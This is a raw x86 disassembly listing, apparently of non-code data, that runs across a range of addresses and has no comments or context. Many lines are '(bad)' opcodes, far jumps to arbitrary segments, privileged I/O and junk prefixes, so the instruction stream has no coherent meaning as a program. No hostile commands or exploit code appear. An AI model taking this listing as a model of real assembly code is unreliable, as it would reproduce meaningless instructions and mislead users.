  42cb2b:	shl    ebp,cl
  42cb2d:	mov    eax,0x919e2e65
  42cb32:	jecxz  0x42cbb3
  42cb34:	sahf   
  42cb35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb36:	dec    edi
  42cb37:	mov    DWORD PTR [esi],esi
  42cb39:	imul   edi,DWORD PTR [ebx-0x77],0xaa62c168
  42cb40:	mov    edi,0xa995ba67
  42cb45:	fcomp  QWORD PTR [ebx]
  42cb47:	push   es
  42cb48:	inc    edi
  42cb49:	loopne 0x42cb9a
  42cb4b:	stos   BYTE PTR es:[edi],al
  42cb4c:	or     ecx,DWORD PTR ds:0xb13e0166
  42cb52:	jo     0x42cbbd
  42cb54:	nop
  42cb55:	fldcw  WORD PTR [ecx]
  42cb57:	pop    edi
  42cb58:	mov    eax,ds:0x57e6165e
  42cb5e:	das    
  42cb5f:	(bad)  
  42cb60:	jae    0x42cbdf
  42cb62:	retf   0x25a5
  42cb65:	xor    BYTE PTR [ecx],cl
  42cb67:	gs mov ebx,0xf7164b5c
  42cb6d:	std    
  42cb6e:	daa    
  42cb6f:	outs   dx,BYTE PTR ds:[esi]
  42cb70:	cwde   
  42cb71:	nop
  42cb72:	cmp    DWORD PTR [esi],edi
  42cb74:	jmp    0x246d735
  42cb79:	adc    DWORD PTR [edi-0x68773438],esi
  42cb7f:	xor    eax,0x4da1f962
  42cb84:	daa    
  42cb85:	call   0x4738:0x9c6f03e2
  42cb8c:	jmp    0x42cbf5
  42cb8e:	inc    edx
  42cb8f:	adc    ecx,ebp
  42cb91:	cmp    esi,DWORD PTR [ebp-0x537cc155]
  42cb97:	jb     0x42cb7b
  42cb99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb9a:	and    ah,ah
  42cb9c:	jae    0x42cbfe
  42cb9e:	xlat   BYTE PTR ds:[ebx]
  42cb9f:	lock mov fs,WORD PTR ss:[esi]
  42cba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cba4:	sbb    DWORD PTR [edx],ebp
  42cba6:	xor    al,0x5
  42cba8:	clc    
  42cba9:	mov    DWORD PTR cs:[ecx-0x50],ebx
  42cbad:	mov    esi,0x3c60fb10
  42cbb2:	cld    
  42cbb3:	dec    esi
  42cbb4:	add    BYTE PTR [eax],dl
  42cbb6:	ss mov dh,0x51
  42cbb9:	jecxz  0x42cc1d
  42cbbb:	shl    BYTE PTR [ecx+ecx*1-0x7e],1
  42cbbf:	xchg   ebp,eax
  42cbc0:	adc    DWORD PTR [esi+0x47dd485a],0x1cbf4285
  42cbca:	fwait
  42cbcb:	xor    eax,0xd3ac65b6
  42cbd0:	ins    DWORD PTR es:[edi],dx
  42cbd1:	adc    BYTE PTR [esi+0x14ea64fb],ah
  42cbd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cbd8:	pop    ecx
  42cbd9:	ss push ss
  42cbdb:	add    ch,BYTE PTR [esi]
  42cbdd:	sbb    ecx,DWORD PTR [edi]
  42cbdf:	pop    ss
  42cbe0:	outs   dx,DWORD PTR ds:[esi]
  42cbe1:	xchg   edi,eax
  42cbe2:	in     al,0x57
  42cbe4:	popf   
  42cbe5:	pop    esi
  42cbe6:	sti    
  42cbe7:	pop    edi
  42cbe8:	test   BYTE PTR [ebx],dl
  42cbea:	call   0x2574:0x1d93cdd8
  42cbf1:	in     eax,0x8b
  42cbf3:	cmp    eax,0xe61a50d7
  42cbf8:	pop    DWORD PTR [ecx+0x27]
  42cbfb:	and    BYTE PTR [esi+0x4b3ac913],bh
  42cc01:	arpl   di,sp
  42cc03:	outs   dx,DWORD PTR ds:[esi]
  42cc04:	int3   
  42cc05:	shl    edx,0xdc
  42cc08:	mov    edx,gs
  42cc0a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42cc0c:	fmul   DWORD PTR [ecx+edi*2]
  42cc0f:	sub    al,0xc5
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xaf3a88e3
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xfd000001
  42cc8d:	pop    esp
  42cc8e:	cmp    cl,BYTE PTR [edx+0x666156da]
  42cc94:	mov    ch,0xa4
  42cc96:	xor    ebx,DWORD PTR [ebx]
  42cc98:	aaa    
  42cc99:	out    dx,eax
  42cc9a:	outs   dx,DWORD PTR ds:[esi]
  42cc9b:	jecxz  0x42cc3b
  42cc9d:	fs dec ebx
  42cc9f:	rcr    BYTE PTR [ebx],1
  42cca1:	mov    ecx,0x49aa235a
  42cca6:	or     BYTE PTR [esi-0x50],ah
  42cca9:	(bad)  
  42ccac:	fadd   st(0),st
  42ccae:	stos   DWORD PTR es:[edi],eax
  42ccaf:	or     ah,BYTE PTR [edx+0x2d086d3c]
  42ccb5:	out    0xb2,eax
  42ccb7:	or     DWORD PTR [ebx-0x5bc218ce],edx
  42ccbd:	xchg   DWORD PTR [edx-0x7a],esp
  42ccc0:	stc    
  42ccc1:	mov    al,0xf5
  42ccc3:	add    esi,DWORD PTR [bx-0x7f1f]
  42ccc8:	add    DWORD PTR [edx+ecx*4-0x3b],eax
  42cccc:	repnz sub BYTE PTR [ecx-0x53aec647],al
  42ccd3:	data16 mov cl,BYTE PTR [edi-0x79]
  42ccd7:	jae    0x42cceb
  42ccd9:	outs   dx,DWORD PTR ds:[esi]
  42ccda:	ficom  DWORD PTR [ecx+0x76da4cc5]
  42cce0:	stos   DWORD PTR es:[edi],eax
  42cce1:	popa   
  42cce2:	in     al,0xae
  42cce4:	pop    esi
  42cce5:	in     al,dx
  42cce6:	push   ecx
  42cce7:	cmp    eax,0xba8589a7
  42ccec:	push   cs
  42cced:	mov    dh,BYTE PTR [esi+0x473d7b34]
  42ccf3:	mov    al,0x80
  42ccf5:	ficom  WORD PTR [edi+ebp*8]
  42ccf8:	das    
  42ccf9:	aas    
  42ccfa:	das    
  42ccfb:	push   0x3a42aa38
  42cd00:	jge    0x42cc84
  42cd02:	jnp    0x42cd18
  42cd04:	xlat   BYTE PTR ds:[ebx]
  42cd05:	stc    
  42cd06:	test   al,0xc8
  42cd08:	pushf  
  42cd09:	std    
  42cd0a:	mov    eax,ds:0xbff33915
  42cd0f:	dec    esi
  42cd10:	stos   DWORD PTR es:[edi],eax
  42cd11:	push   ebx
  42cd12:	sub    DWORD PTR [ebx],esp
  42cd14:	js     0x42cd64
  42cd16:	mov    edi,0x7897a427
  42cd1b:	mov    ah,0xbc
  42cd1d:	mov    edi,0x9c671f0a
  42cd22:	stc    
  42cd23:	jmp    0x44d355a6
  42cd28:	xchg   DWORD PTR [esi+0x59],edi
  42cd2b:	test   BYTE PTR [ecx-0xdd2a4ed],dh
  42cd31:	mov    eax,0xb165f73b
  42cd36:	mov    dh,0x2c
  42cd38:	(bad)  
  42cd39:	out    0x93,al
  42cd3b:	push   es
  42cd3c:	push   ecx
  42cd3d:	pushf  
  42cd3e:	or     eax,0x89720df5
  42cd43:	mov    eax,ds:0xb4f294df
  42cd48:	sub    al,0xcd
  42cd4a:	jp     0x42cdab
  42cd4c:	es inc ebp
  42cd4e:	xchg   ebp,eax
  42cd4f:	or     BYTE PTR [esi-0x7d751ae9],0x13
  42cd56:	mov    al,BYTE PTR [ebx+0x6f]
  42cd59:	or     eax,0x36ddaec1
  42cd5e:	and    eax,0x296d9435
  42cd63:	in     eax,0xe6
  42cd65:	iret   
  42cd66:	call   DWORD PTR [edi-0x1c]
  42cd69:	adc    ebx,esp
  42cd6b:	bnd jb 0x42cd70
  42cd6e:	cs aad 0xb0
  42cd71:	addr16 pop eax
  42cd73:	push   eax
  42cd74:	dec    esp
  42cd75:	jns    0x42cd4c
  42cd77:	pop    DWORD PTR [edi]
  42cd79:	pop    cx
  42cd7b:	cwde   
  42cd7c:	es jl  0x42cd9e
  42cd7f:	stc    
  42cd80:	ins    BYTE PTR es:[edi],dx
  42cd81:	xchg   edx,edx
  42cd83:	(bad)  
  42cd84:	cld    
  42cd85:	push   0xba5d2c35
  42cd8a:	test   BYTE PTR [edi+0x77],0x55
  42cd8e:	inc    ecx
  42cd8f:	and    dh,BYTE PTR [eax+eax*1+0x0]
	...
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x22
  42ce01:	mov    esi,0xe10e92f5
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    eax,0xec000001
  42ce0d:	cmp    DWORD PTR [esi],eax
  42ce0f:	jmp    0x608e:0x27eda21
  42ce16:	int    0x5d
  42ce18:	pop    eax
  42ce19:	gs repnz aam 0x13
  42ce1d:	popf   
  42ce1e:	push   eax
  42ce1f:	stc    
  42ce20:	xor    DWORD PTR [ecx+ecx*8+0x11],0x57179fcb
  42ce28:	dec    ecx
  42ce29:	loop   0x42cdbd
  42ce2b:	out    0x8a,al
  42ce2d:	add    ch,dh
  42ce2f:	inc    esi
  42ce30:	adc    dl,cl
  42ce32:	stos   DWORD PTR es:[edi],eax
  42ce33:	cld    
  42ce34:	out    dx,eax
  42ce35:	jp     0x42ce0a
  42ce37:	inc    ebx
  42ce38:	in     eax,dx
  42ce39:	iret   
  42ce3a:	jmp    0xae86:0xc3fd42b5
  42ce41:	push   esi
  42ce42:	or     cl,BYTE PTR [ecx+0x16]
  42ce45:	fistp  DWORD PTR [edx]
  42ce47:	(bad)  
  42ce48:	fwait
  42ce49:	inc    edi
  42ce4a:	sbb    dl,BYTE PTR [ecx-0xc8bad84]
  42ce50:	rcl    BYTE PTR [eax+0x4b],cl
  42ce53:	pop    ebp
  42ce54:	in     eax,0xe3
  42ce56:	mov    eax,ds:0x435084b2
  42ce5b:	ror    DWORD PTR [edx-0x434f5514],1
  42ce61:	lock enter 0xce45,0x95
  42ce66:	in     eax,0x79
  42ce68:	mov    edx,0xb495b90f
  42ce6d:	rcl    BYTE PTR [ebx-0x3c6921ea],1
  42ce73:	ins    BYTE PTR es:[edi],dx
  42ce74:	mov    bh,0x9e
  42ce76:	adc    DWORD PTR cs:[ecx*8-0x609f4968],eax
  42ce7e:	push   esp
  42ce7f:	xchg   edi,eax
  42ce80:	mov    bh,dl
  42ce82:	fsub   st,st(2)
  42ce84:	call   0x6e99:0x51131215
  42ce8b:	mov    al,0x77
  42ce8d:	std    
  42ce8e:	es leave 
  42ce90:	inc    ebx
  42ce91:	out    dx,al
  42ce92:	(bad)  
  42ce93:	or     cl,cl
  42ce95:	pop    ebp
  42ce96:	mov    eax,ds:0xb74e4eeb
  42ce9b:	xor    bl,BYTE PTR [ebp+0x50]
  42ce9e:	jbe    0x42ce86
  42cea0:	repnz fidivr WORD PTR [edx]
  42cea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cea4:	xor    al,0x81
  42cea6:	jmp    0x42ce30
  42cea8:	gs dec eax
  42ceaa:	inc    edx
  42ceab:	lahf   
  42ceac:	jnp    0x42cef1
  42ceae:	mov    dl,0x17
  42ceb0:	push   esi
  42ceb1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42ceb3:	mov    ecx,0x13dd7a19
  42ceb8:	lea    edx,[esi+edx*2-0x51468819]
  42cebf:	and    bl,BYTE PTR [edx+0x63]
  42cec2:	das    
  42cec3:	push   cs
  42cec4:	sub    dl,bh
  42cec6:	sub    DWORD PTR [ebx+0x7b],edi
  42cec9:	adc    ch,BYTE PTR [eax-0x72]
  42cecc:	test   al,dh
  42cece:	pop    ss
  42cecf:	sub    cl,BYTE PTR [edi-0x39]
  42ced2:	push   edx
  42ced3:	mov    eax,eax
  42ced5:	push   es
  42ced6:	add    edx,DWORD PTR [edx+0x2c]
  42ced9:	dec    esi
  42ceda:	shl    BYTE PTR [edx-0x22],1
  42cedd:	pop    ds
  42cede:	mov    al,ds:0xb2d4b62d
  42cee3:	inc    esi
  42cee4:	xor    esp,DWORD PTR [ecx+0x273ece39]
  42ceea:	rcl    BYTE PTR ds:0xf2677aad,1
  42cef0:	jno    0x42cecb
  42cef2:	aam    0xbb
  42cef4:	ret    
  42cef5:	mov    ebx,DWORD PTR [eax-0x6c]
  42cef8:	add    esp,edx
  42cefa:	es sti 
  42cefc:	test   DWORD PTR [esi],eax
  42cefe:	dec    esi
  42ceff:	jns    0x42cf4b
  42cf01:	and    ecx,DWORD PTR [ecx+eax*4+0x16]
  42cf05:	sbb    ecx,esi
  42cf07:	xchg   esi,eax
  42cf08:	push   ecx
  42cf09:	dec    ebx
  42cf0a:	test   eax,0xbb374b87
  42cf0f:	xor    cl,BYTE PTR [eax]
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	(bad)  
  42cf80:	clc    
  42cf81:	pop    ebp
  42cf82:	mov    ch,BYTE PTR [eax+0x13]
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0xbc000001,al
  42cf8d:	(bad)  [esi]
  42cf8f:	push   0xbc2cade7
  42cf94:	adc    al,0xe2
  42cf96:	add    al,0x18
  42cf98:	pop    edi
  42cf99:	fwait
  42cf9a:	enter  0xf608,0x18
  42cf9e:	mov    gs,WORD PTR [ecx-0x53b44dbb]
  42cfa4:	add    ch,ch
  42cfa6:	mov    esp,0x841cf059
  42cfab:	and    al,0x57
  42cfad:	outs   dx,DWORD PTR ds:[esi]
  42cfae:	aam    0x7a
  42cfb0:	add    eax,DWORD PTR [edi+0x2435530d]
  42cfb6:	(bad)  
  42cfb7:	xlat   BYTE PTR ds:[ebx]
  42cfb8:	std    
  42cfb9:	jno    0x42d00a
  42cfbb:	mov    ah,0x81
  42cfbd:	lds    eax,FWORD PTR [edx*4-0x4b013fdb]
  42cfc4:	ror    BYTE PTR [edx+ebp*2],1
  42cfc7:	mov    fs,WORD PTR [ecx+0x75]
  42cfca:	jecxz  0x42d007
  42cfcc:	rol    DWORD PTR [ebx+ecx*2+0x5dab8bb8],1
  42cfd3:	ins    DWORD PTR es:[edi],dx
  42cfd4:	repnz test eax,esi
  42cfd7:	cdq    
  42cfd8:	jmp    0xfd8e327f
  42cfdd:	out    0x82,al
  42cfdf:	mov    ah,0x54
  42cfe1:	and    eax,0x43bc9298
  42cfe6:	cmp    DWORD PTR [esi-0x4bcd8223],ebx
  42cfec:	adc    BYTE PTR [ebp-0x1294e052],bl
  42cff2:	nop
  42cff3:	jbe    0x42d03a
  42cff5:	aam    0xba
  42cff7:	mov    ebx,0xb672d6c2
  42cffc:	loope  0x42cf86
  42cffe:	fxch   st(6)
  42d000:	es cld 
  42d002:	mov    bh,0xe3
  42d004:	mov    ds:0x1f53e371,eax
  42d009:	test   eax,0x3862c04e
  42d00e:	jo     0x42d074
  42d010:	aad    0x62
  42d012:	out    0x9b,eax
  42d014:	jne    0x42d083
  42d016:	jb     0x42d03e
  42d018:	lock daa 
  42d01a:	popa   
  42d01b:	pop    es
  42d01c:	ins    BYTE PTR es:[edi],dx
  42d01d:	les    edi,FWORD PTR [ebx+0x2e72cb0a]
  42d023:	xor    edx,DWORD PTR [edx-0x5d5b00bf]
  42d029:	sub    BYTE PTR [ebp-0x54],0xc9
  42d02d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d02e:	mov    BYTE PTR [ebx+edx*4],al
  42d031:	and    eax,0xb886e552
  42d036:	jmp    0x42d019
  42d038:	push   ebp
  42d039:	ss out 0x5c,al
  42d03c:	icebp  
  42d03d:	add    eax,0xe2d37543
  42d042:	lahf   
  42d043:	inc    esp
  42d044:	jo     0x42d0af
  42d046:	cmp    BYTE PTR [ebx],dl
  42d048:	in     al,0xb0
  42d04a:	lea    ebx,[ebx+ecx*2-0x72]
  42d04e:	jmp    0x4619:0xe9541d41
  42d055:	jae    0x42d06d
  42d057:	clc    
  42d058:	dec    ebx
  42d059:	mov    esi,0x8c1df752
  42d05e:	mov    edi,DWORD PTR [edi]
  42d060:	pop    ss
  42d061:	ror    BYTE PTR [ebp-0x19],cl
  42d064:	sub    ecx,DWORD PTR [ebx-0x2f]
  42d067:	push   ecx
  42d068:	xchg   edx,eax
  42d069:	xor    edx,DWORD PTR [ecx-0x2d]
  42d06c:	in     al,0x54
  42d06e:	mov    esp,0xbe2cd6d5
  42d073:	sar    BYTE PTR [edi+ecx*2],cl
  42d076:	fldcw  WORD PTR [eax-0x3a]
  42d079:	dec    esp
  42d07a:	das    
  42d07b:	mov    ah,0xd2
  42d07d:	cmp    ch,BYTE PTR [edi]
  42d07f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d080:	(bad)  
  42d081:	cmp    ebx,eax
  42d083:	loop   0x42d0c2
  42d085:	mov    ds:0xe78aef37,al
  42d08a:	retf   
  42d08b:	push   edi
  42d08c:	dec    edi
  42d08d:	loopne 0x42d02a
  42d08f:	repnz and al,BYTE PTR [eax]
	...
  42d0f2:	add    BYTE PTR [eax],al
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [edi+0x18e89980],ch
  42d105:	jecxz  0x42d108
  42d107:	add    BYTE PTR ds:0x5b000001,al
  42d10d:	cmp    eax,0x8cb65b09
  42d112:	ja     0x42d17d
  42d114:	(bad)  
  42d115:	aad    0xde
  42d117:	dec    esi
  42d118:	mov    ?,WORD PTR [esi+0x194da72a]
  42d11e:	loope  0x42d140
  42d120:	push   ss
  42d121:	sub    al,0xb1
  42d123:	xor    al,0x5c
  42d126:	stos   DWORD PTR es:[edi],eax
  42d127:	jg     0x42d0b2
  42d129:	sbb    BYTE PTR [ebp+0x46],ah
  42d12c:	jg     0x42d159
  42d12e:	push   cs
  42d12f:	push   DWORD PTR [eax]
  42d131:	sbb    eax,0x828300
  42d136:	jbe    0x42d17b
  42d138:	mov    BYTE PTR [edi+0x509d1f1b],dl
  42d13e:	pusha  
  42d13f:	jp     0x42d198
  42d141:	jge    0x42d139
  42d143:	adc    eax,0xad245ec4
  42d148:	mov    dl,0xe6
  42d14a:	ins    DWORD PTR es:[edi],dx
  42d14b:	scas   eax,DWORD PTR es:[edi]
  42d14c:	imul   esp,DWORD PTR [edx-0x1d510d8c],0xdbab51d
  42d156:	daa    
  42d157:	pop    eax
  42d158:	sub    esi,DWORD PTR [ecx+0x65]
  42d15b:	add    ebx,ecx
  42d15d:	int    0x98
  42d15f:	inc    DWORD PTR [esi+0x7db3cad4]
  42d165:	inc    DWORD PTR [ecx+ecx*4+0x3c]
  42d169:	hlt    
  42d16a:	sbb    DWORD PTR [eax+0x75],0x41
  42d16e:	sbb    bl,BYTE PTR [eax]
  42d170:	sub    eax,0x65ca717
  42d175:	adc    cl,ch
  42d177:	test   al,0xf5
  42d179:	fst    st(2)
  42d17b:	stos   BYTE PTR es:[edi],al
  42d17c:	mov    bl,0xec
  42d17e:	jle    0x42d16a
  42d180:	sub    cl,BYTE PTR [ecx]
  42d182:	sub    esi,DWORD PTR [esi+0x14e96cf5]
  42d188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d189:	and    esp,DWORD PTR [eax+0x8]
  42d18c:	ret    
  42d18d:	adc    al,0x33
  42d18f:	fstp   DWORD PTR ds:0xdfb5340c
  42d195:	(bad)  
  42d196:	loopne 0x42d185
  42d198:	xlat   BYTE PTR ds:[ebx]
  42d199:	push   0x5b
  42d19b:	mov    eax,ds:0x2ac9bc7d
  42d1a0:	arpl   WORD PTR ds:0xf8b0523a,sp
  42d1a6:	ret    0x679
  42d1a9:	adc    DWORD PTR [esp+eiz*4-0x225f41c9],0x402aaffa
  42d1b4:	sbb    eax,0x389aeb00
  42d1b9:	mov    ebx,0x2643098c
  42d1be:	xchg   edx,eax
  42d1bf:	pushf  
  42d1c0:	xchg   edx,eax
  42d1c1:	sub    BYTE PTR [eax-0x7b],cl
  42d1c4:	inc    ebx
  42d1c5:	cld    
  42d1c6:	xor    DWORD PTR [ebx],ecx
  42d1c8:	pop    edx
  42d1c9:	mov    ecx,0xcd47def8
  42d1ce:	je     0x42d158
  42d1d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1d1:	pop    es
  42d1d2:	xchg   bh,bl
  42d1d4:	es adc eax,0xf9db5bd
  42d1da:	push   es
  42d1db:	jo     0x42d1ca
  42d1dd:	push   ebp
  42d1de:	shl    esi,cl
  42d1e0:	mov    al,ds:0x32e14f7
  42d1e5:	out    0x6f,eax
  42d1e7:	xchg   edi,eax
  42d1e8:	mov    ah,0xdf
  42d1ea:	call   0x1ec0:0xffff6a4f
  42d1f1:	in     al,dx
  42d1f2:	sbb    BYTE PTR [eax-0x73],0x7f
  42d1f6:	xor    eax,0xaaa3ca18
  42d1fb:	cli    
  42d1fc:	mov    ecx,0x1859f409
  42d201:	(bad)  
  42d202:	cmp    al,BYTE PTR [ebx-0x7f]
  42d205:	xchg   ebx,eax
  42d206:	pop    es
  42d207:	sub    ebp,DWORD PTR [edx-0x21]
  42d20a:	add    BYTE PTR [ecx*1-0x2fa8e858],0x0
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2c9
  42d281:	dec    esi
  42d282:	jo     0x42d274
  42d284:	sbb    eax,0x50001e4
  42d289:	add    DWORD PTR [eax],eax
  42d28b:	add    BYTE PTR [edi-0x22947a05],dh
  42d291:	cmp    eax,0xd05fdf26
  42d296:	pop    ss
  42d297:	jns    0x42d310
  42d299:	push   esp
  42d29a:	and    bl,bl
  42d29c:	(bad)  
  42d29e:	cmp    eax,0x15c569a
  42d2a3:	(bad)  
  42d2a5:	ret    0x76fc
  42d2a8:	sti    
  42d2a9:	inc    edi
  42d2aa:	fwait
  42d2ab:	dec    ebx
  42d2ac:	mov    eax,0x812e22d5
  42d2b1:	or     al,0x6c
  42d2b3:	stos   DWORD PTR es:[edi],eax
  42d2b4:	xchg   esp,eax
  42d2b5:	pop    esi
  42d2b6:	ror    BYTE PTR [eax+0x29d1fa24],cl
  42d2bc:	cld    
  42d2bd:	or     DWORD PTR [ebp+0x4ab6a862],edi
  42d2c3:	fistp  WORD PTR [ecx]
  42d2c5:	or     BYTE PTR [edi-0x53],dl
  42d2c8:	inc    eax
  42d2c9:	in     al,0xb9
  42d2cb:	fsubrp st(4),st
  42d2cd:	imul   edx,DWORD PTR [edi-0x5f8a3f98],0x876244ed
  42d2d7:	loope  0x42d274
  42d2d9:	push   cs
  42d2da:	(bad)  [eax+0xc2d884c]
  42d2e0:	mov    WORD PTR [ebx-0x80],?
  42d2e3:	cmovo  eax,DWORD PTR [ebp-0x39d62157]
  42d2ea:	sbb    eax,DWORD PTR [esi+0x12ed4db1]
  42d2f0:	or     DWORD PTR [ebx-0x9],eax
  42d2f3:	in     eax,dx
  42d2f4:	adc    bh,ch
  42d2f6:	lock lods al,BYTE PTR ds:[esi]
  42d2f8:	fistp  QWORD PTR ds:[edx+esi*8+0xe]
  42d2fd:	fnstsw WORD PTR [esi]
  42d2ff:	enter  0xd866,0x73
  42d303:	hlt    
  42d304:	and    DWORD PTR [ebx+0x5f66c7d9],edx
  42d30a:	jecxz  0x42d2db
  42d30c:	cdq    
  42d30d:	and    eax,0x83b3d5
  42d312:	cmp    eax,0x10cd3829
  42d317:	xchg   esp,eax
  42d318:	dec    eax
  42d319:	inc    BYTE PTR [edx+edx*2]
  42d31c:	fldcw  WORD PTR [edi+eax*4]
  42d31f:	xchg   DWORD PTR [edx+0x53],eax
  42d322:	int3   
  42d323:	sbb    esp,DWORD PTR [ebx+eiz*1]
  42d326:	xor    bl,BYTE PTR [ecx+0x63]
  42d329:	or     DWORD PTR [edx],esp
  42d32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d32c:	mov    esi,0xfa82fc1f
  42d331:	push   eax
  42d332:	cs adc eax,0x93ccee8a
  42d338:	sbb    BYTE PTR ds:0x939cfe52,dh
  42d33e:	fbld   TBYTE PTR [edi-0x1]
  42d341:	adc    al,al
  42d343:	mov    bh,BYTE PTR [edx+0x41985da3]
  42d349:	adc    al,0x9c
  42d34b:	shl    BYTE PTR [eax],0x6b
  42d34e:	mov    bl,0x66
  42d350:	addr16 es add ebp,esi
  42d354:	popf   
  42d355:	xlat   BYTE PTR ds:[ebx]
  42d356:	fadd   QWORD PTR ds:0xc4cb5aa4
  42d35c:	mov    esi,?
  42d35e:	add    al,0x74
  42d360:	loop   0x42d3b2
  42d362:	jo     0x42d34e
  42d364:	loopne 0x42d341
  42d366:	(bad)  
  42d367:	icebp  
  42d368:	stos   BYTE PTR es:[edi],al
  42d369:	jb     0x42d383
  42d36b:	jne    0x42d3bb
  42d36d:	push   ds
  42d36e:	rcr    ah,1
  42d370:	xchg   ecx,eax
  42d371:	push   cs
  42d372:	xchg   bh,cl
  42d374:	pop    esp
  42d375:	push   esi
  42d376:	mov    esp,0x64b3fd04
  42d37b:	add    DWORD PTR ds:0xb643e656,0xbef3fb94
  42d385:	mov    eax,0x86476f5d
  42d38a:	sub    dh,BYTE PTR fs:[ecx+0x4d9856d]
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	and    ebx,DWORD PTR ds:0xe5228827
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0xb7000001
  42d40d:	or     DWORD PTR [edx-0x62],0xffffffc8
  42d411:	lods   eax,DWORD PTR ds:[esi]
  42d412:	mov    esp,0x9482650b
  42d417:	xlat   BYTE PTR ds:[ebx]
  42d418:	test   al,0xc4
  42d41a:	fnstcw WORD PTR ds:[eax]
  42d41d:	mov    bh,0x14
  42d41f:	adc    BYTE PTR [ebx+0x1e1070e4],ch
  42d425:	loope  0x42d3f9
  42d427:	mov    ecx,0xed67690
  42d42c:	lods   al,BYTE PTR ds:[esi]
  42d42d:	sbb    al,0x44
  42d42f:	jb     0x42d4a2
  42d431:	xchg   edi,eax
  42d432:	add    eax,0x5c81d09a
  42d437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d438:	test   al,0x75
  42d43a:	js     0x42d4a3
  42d43c:	sbb    eax,edx
  42d43e:	mov    WORD PTR [edi-0x9a1a7bb],?
  42d444:	sub    DWORD PTR gs:0x329e5ee4,0xbdb4bc88
  42d44f:	retf   
  42d450:	popa   
  42d451:	add    BYTE PTR ds:0x7b99c578,al
  42d457:	out    dx,al
  42d458:	add    eax,0x436b20d3
  42d45d:	cld    
  42d45e:	and    ecx,DWORD PTR [ebp+ecx*8+0x1e5d6146]
  42d465:	cs sti 
  42d467:	inc    edx
  42d468:	fs pop edi
  42d46a:	jo     0x42d4cf
  42d46c:	pushf  
  42d46d:	loop   0x42d41a
  42d46f:	dec    ecx
  42d470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d471:	(bad)
  42d476:	pop    es
  42d477:	push   ebx
  42d478:	jb     0x42d469
  42d47a:	lods   eax,DWORD PTR ds:[esi]
  42d47b:	inc    ebp
  42d47c:	cmp    DWORD PTR [ebp-0x78],edi
  42d47f:	addr16 loopne 0x42d44d
  42d482:	push   ebx
  42d483:	push   edi
  42d484:	sbb    BYTE PTR [edx+0x21ca4cb2],0xd7
  42d48b:	test   al,0x25
  42d48d:	sbb    eax,0xf6cb519e
  42d492:	mov    edi,esi
  42d494:	dec    ecx
  42d495:	fidivr WORD PTR [eax-0x59996add]
  42d49b:	mov    DWORD PTR ds:0x9c40f750,ebx
  42d4a1:	fistp  WORD PTR [edx+0x3d5aa4c4]
  42d4a7:	imul   esp,edi,0x71
  42d4aa:	add    ah,BYTE PTR [eax+0x20246040]
  42d4b0:	adc    eax,0xefafe938
  42d4b5:	cmp    eax,0x775f2f0
  42d4ba:	and    DWORD PTR [eax],esp
  42d4bc:	in     al,dx
  42d4bd:	sti    
  42d4be:	sbb    eax,0x7156d0ff
  42d4c3:	inc    esi
  42d4c4:	mov    ebp,0xdab7397e
  42d4c9:	push   ds
  42d4ca:	popf   
  42d4cb:	or     al,0x54
  42d4cd:	add    eax,0x1f9d07cf
  42d4d2:	lods   eax,DWORD PTR ds:[esi]
  42d4d3:	aas    
  42d4d4:	sbb    cl,0xdf
  42d4d7:	and    al,0xe6
  42d4d9:	mov    edx,0x93d902ad
  42d4de:	dec    ebp
  42d4df:	mov    esi,DWORD PTR [esp+ebp*1-0x19]
  42d4e3:	gs je  0x42d543
  42d4e6:	fld    st(4)
  42d4e8:	add    dl,BYTE PTR [esi+eax*1+0x73]
  42d4ec:	mov    al,0x48
  42d4ee:	mov    bh,bh
  42d4f0:	fisttp WORD PTR [eax-0xc]
  42d4f3:	(bad)  
  42d4f4:	pop    edi
  42d4f5:	pop    esi
  42d4f6:	scas   eax,DWORD PTR es:[edi]
